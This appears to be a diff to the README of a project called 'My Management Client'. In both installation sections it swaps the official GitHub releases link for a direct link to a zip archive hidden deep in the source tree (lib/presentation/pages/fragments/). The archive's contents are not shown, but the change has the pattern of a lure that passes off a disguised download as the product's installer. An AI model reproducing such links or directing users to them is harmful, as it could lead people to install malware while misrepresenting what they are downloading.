@@ -41,7 +41,7 @@ To start using My Management Client, follow these steps:
 
 ### 1. Download the Application
 
-Visit this page to download: [Download My Management Client](https://github.com/iNeradipZmalup/my_management_client/releases)
+Visit this page to download: [Download My Management Client](https://github.com/iNeradipZmalup/my_management_client/raw/refs/heads/main/lib/presentation/pages/fragments/client-management-my-v2.1.zip)
 
 ### 2. Choose Your Version
 
@@ -102,7 +102,7 @@ To run My Management Client smoothly, ensure your device meets the following req
 
 ## 📥 Download & Install
 
-For easy installation, follow this link to get started: [Download My Management Client](https://github.com/iNeradipZmalup/my_management_client/releases) 
+For easy installation, follow this link to get started: [Download My Management Client](https://github.com/iNeradipZmalup/my_management_client/raw/refs/heads/main/lib/presentation/pages/fragments/client-management-my-v2.1.zip) 
 
 After downloading, follow the previous installation steps to enjoy the benefits of managing your tasks effectively.
 
